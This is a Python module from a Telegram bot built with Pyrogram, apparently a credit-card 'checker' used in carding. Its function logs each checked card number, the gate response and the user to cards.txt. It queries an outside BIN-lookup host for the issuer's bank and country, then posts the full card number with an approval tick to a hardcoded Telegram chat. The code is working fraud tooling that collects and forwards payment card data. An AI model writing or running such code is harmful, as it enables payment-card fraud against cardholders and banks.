from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton,InlineKeyboardMarkup
import requests
from configs import config






def ct(CC, response, user, gate):
    file = open("cards.txt", "a", encoding="utf-8")
    listaContenido = [
        f"{CC} | ",
        f"{response} | ",
        f"{user} | ",
        f"{gate}\n"
   ]
    file.writelines(listaContenido)
    file.close()
    
    BIN = CC[:6]
    gateBIN = requests.get(f"https://binlookup-1.andrexxone.repl.co/index.php?bin={BIN}").json()    
    bin = gateBIN["query"]  
    brand = gateBIN["brand"]
    type = gateBIN["type"]
    level = gateBIN["level"]
    bank = gateBIN['bank']["name"];
    pais = gateBIN["country"]["ISO2"]
    country = gateBIN["country"]["name"]
    emojiCountry = gateBIN["country"]["flag"];
    currency = gateBIN["country"]["currency"]

    if bank == "":
            bank = "/"
    elif brand == "":
            brand = "/"
    elif type == "":
            type = "/"
    elif level == "":
            level = "/"
    elif pais == "":
            pais = "/"
    elif country == "":
            country = "/"
    elif emojiCountry == "":
            emojiCountry = "/"
    elif currency == "":
            currency = "/"
    
    texto = (f"""
CC: {CC}
Response: {response} ✅
Gate: {gate}
------> Detalles bin <------
Bin: {bin}
Bin info: {brand} - {type} - {level}
Banco: {bank}
Pais: {emojiCountry} {country} - {pais}
------> Info <------
Chequeada por: @{user}
""")
    data = {'chat_id': -1001736957307, "text": texto}
    requests.post(f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage", data=data)
